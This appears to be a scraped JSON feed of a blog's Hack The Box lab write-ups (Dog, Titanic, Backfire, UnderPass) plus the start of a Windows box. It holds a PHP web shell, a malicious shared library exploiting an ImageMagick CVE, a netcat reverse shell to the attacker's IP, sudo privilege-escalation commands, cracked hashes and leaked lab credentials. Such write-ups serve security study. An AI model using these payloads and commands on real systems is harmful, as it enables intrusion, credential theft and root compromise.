[{"content":"Summary User: Webapp credentials in source code using GitHack + RCE via upload of a malicious archive.\nRoot: Sudo misconfiguration of bee CLI.\nEnumeration Using nmap, we can identify a web service on port 80 and SSH exposed on port 22.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 $ nmap -Pn -p- 10.129.208.97 -v -A PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA) | 256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA) |_ 256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Home | Dog | http-robots.txt: 22 disallowed entries (15 shown) | /core/ /profiles/ /README.md /web.config /admin | /comment/reply /filter/tips /node/add /search /user/register |_/user/password /user/login /user/logout /?q=admin /?q=comment/reply |_http-generator: Backdrop CMS 1 (https://backdropcms.org) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-favicon: Unknown favicon MD5: 3836E83A3E835A26D789DDA9E78C5510 |_http-server-header: Apache/2.4.41 (Ubuntu) | http-git: | 10.129.208.97:80/.git/ | Git repository found! | Repository description: Unnamed repository; edit this file \u0026#39;description\u0026#39; to name the... |_ Last commit message: todo: customize url aliases. reference:https://docs.backdro... User Git dump + RCE via shell.tar The nmap scan revealed that the git repository of the webapp is exposed.\nUsing GitHack, we are going to partially retrieve the source code of this web application. 1 2 3 4 5 6 7 8 9 $ ls GitHack.py index lib README.md $ python GitHack.py http://dog.htb/.git [+] Download and parse index file ... [+] LICENSE.txt [+] README.md [+] core/.jshintignore ... In those files, we can find a username tiffany and a password BackDropJ2024DS2024 1 2 3 4 5 6 7 $ grep -ir dog.htb . ./dog.htb/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json: \u0026#34;tiffany@dog.htb\u0026#34; $ cat -n settings.php ... 15 $database = \u0026#39;mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop\u0026#39;; ... Using those credentials, we gain access to the webapp http://dog.htb as tiffany.\nWe can find the version of Backdrop in the Reports tab then Status report.\nThis version 1.27.7 is vulnerable to an RCE. The following exploit could work but our instance of backdrop doesn\u0026rsquo;t accept .zip archives.\nWe can find this information in the Functionality tab then Install new modules. So, we are going to take the HTML/PHP code and shell.info content of this exploit in order to create a shell.tar archive.\nThen, on the same page we are going to install this new module. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 $ cat shell.php \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form method=\u0026#34;GET\u0026#34; name=\u0026#34;\u0026lt;?php echo basename($_SERVER[\u0026#39;PHP_SELF\u0026#39;]); ?\u0026gt;\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;TEXT\u0026#34; name=\u0026#34;cmd\u0026#34; autofocus id=\u0026#34;cmd\u0026#34; size=\u0026#34;80\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;SUBMIT\u0026#34; value=\u0026#34;Execute\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;pre\u0026gt; \u0026lt;?php if(isset($_GET[\u0026#39;cmd\u0026#39;])) { system($_GET[\u0026#39;cmd\u0026#39;]); } ?\u0026gt; \u0026lt;/pre\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; $ cat shell.info type = module name = Block description = Controls the visual building blocks a page is constructed with. Blocks are boxes of content rendered into an area, or region, of a web page. package = Layouts tags[] = Blocks tags[] = Site Architecture version = BACKDROP_VERSION backdrop = 1.x configure = admin/structure/block ; Added by Backdrop CMS packaging script on 2024-03-07 project = backdrop version = 1.27.1 timestamp = 1709862662 $ tar cvf shell.tar shell.php shell.info shell.php shell.info Even if this new module is not listed in the list of installed modules, we can access it through /modules/shell/shell.php, as specified in the exploit. In the home directory, we can find two users, jobert and johncusack. Using the previously discovered password BackDropJ2024DS2024, we gain SSH access to the machine as johncusack and are able to retrieve the user.txt flag. 1 2 3 $ ssh johncusack@dog.htb johncusack@dog:~$ ls user.txt Root Sudo misconfiguration Johncusack can use bee CLI as root via sudo. 1 2 3 4 5 6 7 johncusack@dog:~$ sudo -l [sudo] password for johncusack: Matching Defaults entries for johncusack on dog: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User johncusack may run the following commands on dog: (ALL : ALL) /usr/local/bin/bee This CLI \u0026ldquo;allows developers to interact with Backdrop sites\u0026rdquo; as specified on their GitHub.\nAs we can see in the documentation, we can execute PHP code.\n1 2 3 4 5 6 johncusack@dog:~$ sudo bee ... eval ev, php-eval Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop. ... First, we are going to move to /var/www/html so bee can interact with our backdrop site.\nThen, we set the SUID flag to /bin/bash and get a root shell in order to read the root.txt flag. 1 2 3 4 5 6 7 8 9 johncusack@dog:~$ cd /var/www/html johncusack@dog:/var/www/html$ sudo /usr/local/bin/bee php-eval \u0026#39;exec(\u0026#34;chmod u+s /bin/bash\u0026#34;)\u0026#39; johncusack@dog:/var/www/html$ ls -l /bin/bash -rwsr-xr-x 1 root root 1183448 Apr 18 2022 /bin/bash johncusack@dog:/var/www/html$ /bin/bash -p bash-5.0# id uid=1001(johncusack) gid=1001(johncusack) euid=0(root) groups=1001(johncusack) bash-5.0# ls /root root.txt Resources GitHack\nRCE exploit - Backdrop v1.27.1\n","date":"2025-07-12T00:00:00Z","image":"https://01MI.github.io/p/dog-htb-writeup-linux-easy/Dog_hu_2652b157db0b587e.PNG","permalink":"https://01MI.github.io/p/dog-htb-writeup-linux-easy/","title":"Dog - Linux Easy - HTB Writeup"},{"content":"Summary User: Path traversal on the titanic.htb application\nRoot: Arbitrary code execution via CVE-2024-41817(ImageMagick).\nEnumeration Using an nmap scan, we can identify a web service on port 80 and SSH exposed on port 22.\n1 2 3 4 5 6 7 8 9 10 11 $ nmap -Pn -p 80,22 10.129.175.139 -v -A PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA) |_ 256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519) 80/tcp open http Apache httpd 2.4.52 |_http-title: Did not follow redirect to http://titanic.htb/ |_http-server-header: Apache/2.4.52 (Ubuntu) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS User Path traversal While exploring titanic.htb, we notice that if we submit the booking form, a JSON of our booking data is downloaded.\n1 2 3 4 5 6 7 8 $ cat 5a41afb2-469c-4d75-8faf-4c1b70d398be.json | jq . { \u0026#34;name\u0026#34;: \u0026#34;test\u0026#34;, \u0026#34;email\u0026#34;: \u0026#34;test@test.com\u0026#34;, \u0026#34;phone\u0026#34;: \u0026#34;test-01\u0026#34;, \u0026#34;date\u0026#34;: \u0026#34;2025-06-18\u0026#34;, \u0026#34;cabin\u0026#34;: \u0026#34;Deluxe\u0026#34; } On Burp, the ticket parameter via the /download endpoint allows specifying the file to download.\nThe lack of control or validation on this parameter allows us to read files on the machine via a path traversal.\nThis vulnerability allows us to retrieve the following information:\n/etc/passwd indicates the existence of the user developer.\n/etc/hosts allows us to retrieve a new subdomain, dev.\nGitea For now, we can\u0026rsquo;t go further, letâ€™s explore dev.titanic.htb.\nWe find an instance of Gitea, a self-hosted version control tool using git. We find two publicly accessible repositories, docker-config and flask-app .\nIn the docker-config repository, we find MySQL crendentials in the file /mysql/docker-compose.yml.\nThe nmap scan did not identify MySQL access, we keep these credentials aside.\nStill in this same repo, in /gitea/docker-compose.yml, we find the path to a volume.\nUsing this path, the previously found path traversal vulnerability and Gitea documentation, we can retrieve the Gitea configuration file.\nAfter several attempts, it is located at /home/developer/gitea/data/gitea/conf/app.ini.\nIn this config file, we find the path of the Gitea database, we use the website to retrieve it.\nExploring this database with sqlite3, we can retrieve the hashes of developer and administrator.\n1 2 3 4 5 $ sqlite3 gitea.db ... sqlite\u0026gt; select * from user; 1|administrator|administrator||root@titanic.htb|0|enabled|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50|0|0|0||0|||70a5bd0c1a5d23caa49030172cdcabdc|2d149e5fbd1b20cf31db3e3c6a28fc9b|en-US||1722595379|1722597477|1722597477|0|-1|1|1|0|0|0|1|0|2e1e70639ac6b0eecbdab4a3d19e0f44|root@titanic.htb|0|0|0|0|0|0|0|0|0||gitea-auto|0 2|developer|developer||developer@titanic.htb|0|enabled|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|0|0|0||0|||0ce6f07fc9b557bc070fa7bef76a0d15|8bf3e3452b78544f8bee9400d6936d34|en-US||1722595646|1722603397|1722603397|0|-1|1|0|0|0|0|1|0|e2d95b7e207e432f62f3508be406c11b|developer@titanic.htb|0|0|0|0|2|0|0|0|0||gitea-auto|0 The hashes are in PBKDF2 format and can be converted using gitea2hashcat.py to be compatible with Hashcat. Then, we can easily retrieve the developer account password. 1 2 3 4 5 6 7 8 $ sqlite3 gitea.db \u0026#39;select salt,passwd from user;\u0026#39; | ./gitea2hashcat.py [+] Run the output hashes through hashcat mode 10900 (PBKDF2-HMAC-SHA256) sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY= sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y= $ hashcat -a 0 -m 10900 hash /usr/share/wordlists/rockyou.txt ... sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528 We use this password to SSH into the machine and retrieve the flag.\n1 2 3 4 5 6 $ ssh developer@titanic.htb ... developer@titanic:~$ ls gitea mysql user.txt developer@titanic:~$ cat user.txt e85d89a008cff72094f40882eb2f7d9b Root CVE-2024-41817(ImageMagick) Once on the machine, we notice the script identify_images.sh in /opt/scripts/. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 developer@titanic:/opt$ tree . . â”œâ”€â”€ app â”‚Â â”œâ”€â”€ app.py â”‚Â â”œâ”€â”€ static â”‚Â â”‚Â â”œâ”€â”€ assets â”‚Â â”‚Â â”‚Â â””â”€â”€ images â”‚Â â”‚Â â”‚Â â”œâ”€â”€ entertainment.jpg â”‚Â â”‚Â â”‚Â â”œâ”€â”€ exquisite-dining.jpg â”‚Â â”‚Â â”‚Â â”œâ”€â”€ favicon.ico â”‚Â â”‚Â â”‚Â â”œâ”€â”€ home.jpg â”‚Â â”‚Â â”‚Â â”œâ”€â”€ luxury-cabins.jpg â”‚Â â”‚Â â”‚Â â””â”€â”€ metadata.log â”‚Â â”‚Â â””â”€â”€ styles.css â”‚Â â”œâ”€â”€ templates â”‚Â â”‚Â â””â”€â”€ index.html â”‚Â â””â”€â”€ tickets â”œâ”€â”€ containerd [error opening dir] â””â”€â”€ scripts â””â”€â”€ identify_images.sh 8 directories, 10 files developer@titanic:/opt$ cat scripts/identify_images.sh cd /opt/app/static/assets/images truncate -s 0 metadata.log find /opt/app/static/assets/images/ -type f -name \u0026#34;*.jpg\u0026#34; | xargs /usr/bin/magick identify \u0026gt;\u0026gt; metadata.log This command identifies the format and characteristics of files ending with .jpg in /opt/app/static/assets/images/ and stores them in /opt/app/static/assets/metadata.log.\nWe notice the timestamp of metadata.log is updated every minute, the script is owned by root so it could be in a cron job.\nThe commands truncate, find, xargs are not exploitable here. Imagemagick being a tool used in CTFs in vulnerable versions, we look for CVEs associated with its version 7.1.1-35.\n1 2 3 developer@titanic:~$ magick --version Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org ... We find this advisory on Github regarding CVE-2024-41817 allowing arbitrary code execution on versions \u0026lt;= 7.1.1-35.\nTo obtain code execution as root, we will adapt the POC mentioned by replacing id to set the SUID on /bin/bash. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 developer@titanic:/tmp$ cat libxcb #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; __attribute__((constructor)) void init(){ system(\u0026#34;chmod +s /bin/bash\u0026#34;); exit(0); } developer@titanic:/tmp$ gcc -x c -shared libxcb.c -fPIC -o ./libxcb.so.1 developer@titanic:/tmp$ mv libxcb.so.1 /opt/app/static/assets/images/ developer@titanic:/tmp$ ls -ld /bin/bash -rwsr-sr-x 1 root root 1396520 Mar 14 2024 /bin/bash developer@titanic:/tmp$ bash -p bash-5.1# id uid=1000(developer) gid=1000(developer) euid=0(root) egid=0(root) groups=0(root),1000(developer) bash-5.1# ls /root cleanup.sh images revert.sh root.txt snap Resources gitea2hashcat.py\nAdvisory Github for CVE-2024-41817\n","date":"2025-06-21T00:00:00Z","image":"https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Titanic_hu_1050c0167f506c80.PNG","permalink":"https://01MI.github.io/p/titanic-htb-writeup-linux-easy/","title":"Titanic - Linux Easy - HTB Writeup"},{"content":"Summary User Ilya: Havoc C2 Exploit: SSRF + RCE\nLateral mouvement to Sergej: HardHat C2 Exploit: Authentification bypass + RCE\nRoot: Sudo misconfiguration\nEnumeration Starting with an nmap scan, we can identify two web services, the one accessible on port 8000 catch our attention here.\n1 2 3 4 5 6 7 8 $ nmap 10.10.11.49 -Pn -v PORT STATE SERVICE 22/tcp open ssh 443/tcp open https 5000/tcp filtered upnp 7096/tcp filtered unknown 8000/tcp open http-alt User Ilya Exploit Havoc C2: SRF + RCE The directory listing exposed on the port 8000 allows us to retrieve two files:\ndisable.tls.patch: This file indicates that TLS is disabled for WebSocket management on port 40056, allowing an unsecure connection. havoc.yaotl: A configuration file for the Havoc C2 framework. These files suggest that the exploitation will rely on one or more vulnerabilities related to the Havoc command and control (C2) server.\nAfter some digging, we came across this exploit: https://github.com/sebr-dev/Havoc-C2-SSRF-to-RCE.\nThis exploit combines two vulnerabilities:\nCVE-2024-41570, which exploits an SSRF flaw to open a TCP socket on the main server (teamserver) allowing data read/write. A command injection that lets an authenticated user execute commands on that server. After installing the Havoc framework, we launch both the server and the client.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 $ ./havoc server --verbose --debug --profile /home/kali/TÃ©lÃ©chargements/havoc.yaotl _______ _______ _______ â”‚\\ /â”‚( ___ )â”‚\\ /â”‚( ___ )( ____ \\ â”‚ ) ( â”‚â”‚ ( ) â”‚â”‚ ) ( â”‚â”‚ ( ) â”‚â”‚ ( \\/ â”‚ (___) â”‚â”‚ (___) â”‚â”‚ â”‚ â”‚ â”‚â”‚ â”‚ â”‚ â”‚â”‚ â”‚ â”‚ ___ â”‚â”‚ ___ â”‚( ( ) )â”‚ â”‚ â”‚ â”‚â”‚ â”‚ â”‚ ( ) â”‚â”‚ ( ) â”‚ \\ \\_/ / â”‚ â”‚ â”‚ â”‚â”‚ â”‚ â”‚ ) ( â”‚â”‚ ) ( â”‚ \\ / â”‚ (___) â”‚â”‚ (____/\\ â”‚/ \\â”‚â”‚/ \\â”‚ \\_/ (_______)(_______/ pwn and elevate until it\u0026#39;s done [12:47:51] [DBUG] [cmd.init.func2:59]: Debug mode enabled [12:47:51] [INFO] Havoc Framework [Version: 0.7] [CodeName: Bites The Dust] [12:47:51] [INFO] Havoc profile: /home/kali/TÃ©lÃ©chargements/havoc.yaotl [12:47:51] [INFO] Build: - Compiler x64 : data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc - Compiler x86 : data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc - Nasm : /usr/bin/nasm [12:47:51] [INFO] Time: 04/06/2025 12:47:51 ... 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 $ ./havoc client _______ _______ _______ â”‚\\ /â”‚( ___ )â”‚\\ /â”‚( ___ )( ____ \\ â”‚ ) ( â”‚â”‚ ( ) â”‚â”‚ ) ( â”‚â”‚ ( ) â”‚â”‚ ( \\/ â”‚ (___) â”‚â”‚ (___) â”‚â”‚ â”‚ â”‚ â”‚â”‚ â”‚ â”‚ â”‚â”‚ â”‚ â”‚ ___ â”‚â”‚ ___ â”‚( ( ) )â”‚ â”‚ â”‚ â”‚â”‚ â”‚ â”‚ ( ) â”‚â”‚ ( ) â”‚ \\ \\_/ / â”‚ â”‚ â”‚ â”‚â”‚ â”‚ â”‚ ) ( â”‚â”‚ ) ( â”‚ \\ / â”‚ (___) â”‚â”‚ (____/\\ â”‚/ \\â”‚â”‚/ \\â”‚ \\_/ (_______)(_______/ pwn and elevate until it\u0026#39;s done [12:47:53] [info] Havoc Framework [Version: 0.7] [CodeName: Bites The Dust] [12:47:53] [info] loaded config file: client/config.toml [12:47:54] [info] Connecting to profile: HTB \u0026lt;string\u0026gt;:114: SyntaxWarning: invalid escape sequence \u0026#39;\\W\u0026#39; [12:47:54] [info] Started \u0026#34;Demon Listener\u0026#34; listener Using the Ilya account retrieved from the Havoc configuration file, we run the exploit with the following command to gain a reverse shell on the server:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ python3 CVE-2024-41570.py -t https://10.10.11.49 -i 127.0.0.1 -p 40056 -U ilya -P \u0026#39;CobaltStr1keSuckz!\u0026#39; [***] Trying to register agent... [***] Success! [***] Trying to open socket on the teamserver... [***] Success! [***] Trying to write to the socket [***] Success! [***] Trying to poll teamserver for socket output... [***] Read socket output successfully! ... Enter command to execute: busybox nc 10.10.14.173 80 -e sh [***] Trying to write to the socket [***] Success! [***] Trying to poll teamserver for socket output... [***] Read socket output successfully! As the reverse shell was unstable and kept disconnecting, we add our public SSH key to Ilyaâ€™s SSH authorized_keys file for a more stable access. 1 2 3 4 5 6 7 $ nc -lvnp 80 listening on [any] 80 ... connect to [10.10.14.173] from (UNKNOWN) [10.10.11.49] 60884 echo \u0026#34;ssh-ed25519 A...k kali@kali\u0026#34; \u0026gt;\u0026gt; /home/ilya/.ssh/authorized_keys cat /home/ilya/.ssh/authorized_keys ... ssh-ed25519 A...k kali@kali Then, we can access the server via SSH and grab the user flag. 1 2 3 4 5 6 $ ssh -i ~/.ssh/id_ed25519 ilya@10.10.11.49 ... ilya@backfire:~$ ls files hardhat.txt Havoc user.txt ilya@backfire:~$ cat user.txt b96[...]016b Lateral mouvement: Sergej Exploit HardHat C2: Authentification bypass + RCE Inside Ilyaâ€™s home directory, there is a file called hardhat.txt containing the following content:\n1 2 3 4 5 ilya@backfire:~$ ls files hardhat.txt Havoc user.txt ilya@backfire:~$ cat hardhat.txt Sergej said he installed HardHatC2 for testing and not made any changes to the defaults I hope he prefers Havoc bcoz I don\u0026#39;t wanna learn another C2 framework, also Go \u0026gt; C# Checking the open ports confirms that a HardHat instance, another command and control server, is running on the machine:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ilya@backfire:~$ netstat -planetu .. Proto Recv-Q Send-Q Local Address Foreign Address State User Inode PID/Program name tcp 0 0 0.0.0.0:5000 0.0.0.0:* LISTEN 1001 50679 - tcp 0 0 0.0.0.0:7096 0.0.0.0:* LISTEN 1001 51911 - tcp 0 0 127.0.0.1:40056 0.0.0.0:* LISTEN 1000 54307 - tcp 0 0 0.0.0.0:443 0.0.0.0:* LISTEN 0 21679 - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 0 22673 - tcp 0 0 0.0.0.0:8000 0.0.0.0:* LISTEN 0 21680 - tcp 0 0 127.0.0.1:8443 0.0.0.0:* LISTEN 1000 53569 - tcp 0 0 10.10.11.49:55332 10.10.14.156:80 ESTABLISHED 1000 54389 4854/sh tcp 0 0 127.0.0.1:40056 127.0.0.1:35702 ESTABLISHED 1000 53582 - tcp 0 0 127.0.0.1:35702 127.0.0.1:40056 ESTABLISHED 1000 54337 - tcp 0 272 10.10.11.49:22 10.10.14.156:36602 ESTABLISHED 0 53621 - tcp6 0 0 :::22 :::* LISTEN 0 22684 - udp 0 0 0.0.0.0:68 0.0.0.0:* 0 15357 - udp 0 0 10.10.11.49:43747 8.8.8.8:53 ESTABLISHED 997 54599 - udp 0 0 10.10.11.49:58233 8.8.8.8:53 ESTABLISHED 1001 53738 - udp 0 0 10.10.11.49:44241 8.8.8.8:53 ESTABLISHED 1001 54632 - Since Sergej made no changes to the default configuration of the C2, we will rely on the following article to compromise his account: https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7\nMore specifically, we focus on vulnerabilities 2 and 3.\nThe first vulnerability, an authentication bypass, exploits the fact that HardHat uses a static key to sign JWTs, which here allows us to create authentication tokens for any role.\nWe then forward the port 5000 to use the script from the article and create a new user with the role of TeamLead.\n1 ssh -L 5000:localhost:5000 ilya@10.10.11.49 In the script, we set set the rhostparameter to rhost = 'localhost:5000' and proceed to create our new user.\n1 2 3 4 5 6 $ python3 ./exploit.py ... Generated JWT: ey...oH6CDUNc ... User sth_pentest created Now that our user has been created, we\u0026rsquo;ll exploit the second vulnerability to achieve code execution through the HardHat interface available on port 7096.\nFirst, we forward this port and log in using our stj_pentest account.\n1 $ ssh -L 7096:localhost:7096 ilya@10.10.11.49 Next, we will access the ImplantInteract page to use the integrated console.\nWe confirm that commands are executed as Sergej, so we add our public key to this user\u0026rsquo;s authorized_keys file in order to connect via SSH.\nRoot Sudo misconfiguration Once connected via SSH, we notice a misconfiguration of the sudo utility for the user Sergej.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 $ ssh -i ~/.ssh/id_ed25519 sergej@10.10.11.49 Linux backfire 6.1.0-29-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-01-02) x86_64 sergej@backfire:~$ ls HardHatC2 hardhat_firewall.sh sergej@backfire:~$ cat hardhat_firewall.sh #!/bin/bash #sudo /usr/sbin/iptables-save \u0026gt; /tmp/rules.v4 sudo /usr/sbin/iptables -F sudo /usr/sbin/iptables -A INPUT -p tcp -s localhost --dport 5000 -j ACCEPT sudo /usr/sbin/iptables -A INPUT -p tcp --dport 5000 -j REJECT sudo /usr/sbin/iptables -A INPUT -p tcp -s localhost --dport 7096 -j ACCEPT sudo /usr/sbin/iptables -A INPUT -p tcp --dport 7096 -j REJECT sergej@backfire:~$ sudo -l Matching Defaults entries for sergej on backfire: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty User sergej may run the following commands on backfire: (root) NOPASSWD: /usr/sbin/iptables (root) NOPASSWD: /usr/sbin/iptables-save We will rely on the following article to escalate our privileges: https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/\nHere, the preservation of newlines in iptables comments allows us to write to an arbitrary file using iptables-save.\nWe proceed to overwrite the root authorized_keys file to add our own key allowing us to gain SSH access as root.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 sergej@backfire:~$ sudo iptables -A INPUT -i lo -j ACCEPT -m comment --comment $\u0026#39;\\nssh-ed25519 AA...Dk kali@kali\\n\u0026#39; sergej@backfire:~$ sudo iptables -S -P INPUT ACCEPT -P FORWARD ACCEPT -P OUTPUT ACCEPT -A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 5000 -j ACCEPT -A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 5000 -j ACCEPT -A INPUT -p tcp -m tcp --dport 5000 -j REJECT --reject-with icmp-port-unreachable -A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 7096 -j ACCEPT -A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 7096 -j ACCEPT -A INPUT -p tcp -m tcp --dport 7096 -j REJECT --reject-with icmp-port-unreachable -A INPUT -i lo -m comment --comment \u0026#34; ssh-ed25519 AA...Dk kali@kali \u0026#34; -j ACCEPT sergej@backfire:~$ sudo iptables-save -f /root/.ssh/authorized_keys 1 2 3 4 5 $ ssh -i ~/.ssh/id_ed25519 root@10.10.11.49 root@backfire:~# ls root.txt root@backfire:~# cat root.txt a7b[...]74e Resources GitHub Repo for the Havoc C2 Framework\nGitHub Repo for the Havoc C2 SSRF + RCE Exploit\nMedium Article for the HardHat C2 Exploit\nArticle Explaining How to Exploit iptables and iptables-save via a sudo Misconfiguration\n","date":"2025-06-07T00:00:00Z","image":"https://01MI.github.io/p/backfire-htb-writeup-linux-medium/Backfire_hu_e6f6f2a7cc70aa3e.PNG","permalink":"https://01MI.github.io/p/backfire-htb-writeup-linux-medium/","title":"Backfire - Linux Medium - HTB Writeup"},{"content":"Summary User: Default credentials and weak password reuse\nRoot: Sudo Privilege escalation\nEnumeration Starting with a simple nmap scan, we can identify that ssh and a web service are exposed. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 $ nmap -Pn -p- 10.10.11.48 -A -v PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA) |_ 256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519) 80/tcp open http Apache httpd 2.4.52 ((Ubuntu)) | http-methods: |_ Supported Methods: OPTIONS HEAD GET POST |_http-title: Apache2 Ubuntu Default Page: It works |_http-server-header: Apache/2.4.52 (Ubuntu) 7294/tcp filtered unknown 12945/tcp filtered unknown 37517/tcp filtered unknown 39220/tcp filtered unknown 44459/tcp filtered unknown 55246/tcp filtered unknown 55628/tcp filtered unknown 64827/tcp filtered unknown User Fuzzing While fuzzing on port 80 with ffuf, we discover the path /daloradius/app/operators.\nNavigating to this endpoint redirects us to a Daloradius login interface, an \u0026ldquo;advanced RADIUS web platform aimed at managing hotspots and general-purpose SP deployments\u0026rdquo;. 1 2 3 4 5 6 7 8 9 10 11 $ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.11.48/FUZZ daloradius [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 15ms] \u0026lt;...\u0026gt; $ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.11.48/daloradius/FUZZ app [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 15ms] \u0026lt;...\u0026gt; $ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.11.48/daloradius/app/FUZZ operators [Status: 301, Size: 329, Words: 20, Lines: 10, Duration: 87ms] \u0026lt;...\u0026gt; Path: http://10.10.11.48/daloradius/app/operators/login.php Default credentials Using the default credentials administrator:radius, which are easily found on the internet, we gain access to the home page.\nThen, we can navigate to the users and notice the password for svcMosh appears to be an MD5 hash. We can use hashcat to recover the password. 1 2 3 4 $ hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt \u0026lt;...\u0026gt; 412dd4759978acfcc81deab01b382403:underwaterfriends \u0026lt;...\u0026gt; Using those credentials, we gain access to the server as svcMosh using SSH. 1 2 3 4 5 6 $ ssh svcMosh@10.10.11.48 \u0026lt;...\u0026gt; svcMosh@underpass:~$ pwd /home/svcMosh svcMosh@underpass:~$ ls user.txt Root Sudo Privilege escalation svcMosh is allowed to execute mosh-server, a component of the Mosh remote shell used for interactive SSH-like sessions.\nSince it can be run with sudo, we can leverage it to obtain a root shell. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 svcMosh@underpass:~$ sudo -l Matching Defaults entries for svcMosh on localhost: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User svcMosh may run the following commands on localhost: (ALL) NOPASSWD: /usr/bin/mosh-server svcMosh@underpass:~$ sudo /usr/bin/mosh-server MOSH CONNECT 60002 zl0g6Tbx/KIgOR0jzdQ9wA \u0026lt;...\u0026gt; svcMosh@underpass:~$ MOSH_KEY=zl0g6Tbx/KIgOR0jzdQ9wA mosh-client 127.0.0.1 60002 root@underpass:~# pwd /root root@underpass:~# ls root.txt ","date":"2025-05-10T00:00:00Z","image":"https://01MI.github.io/p/underpass-htb-writeup-linux-easy/UnderPass_hu_13c39bad291cb91e.PNG","permalink":"https://01MI.github.io/p/underpass-htb-writeup-linux-easy/","title":"UnderPass - Linux Easy - HTB Writeup"},{"content":"If you\u0026rsquo;re familiar with Windows boxes, this one is fairly straightforward as it follows classic exploitation paths.\nSummary User: ACL-based privileges\nRoot: ACL-based privileges, DCsync\nEnumeration Using an Nmap scan, we can identify that this machine is an Active Directory Domain Controller. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 $ nmap -Pn -p- 10.10.11.42 -v PORT STATE SERVICE 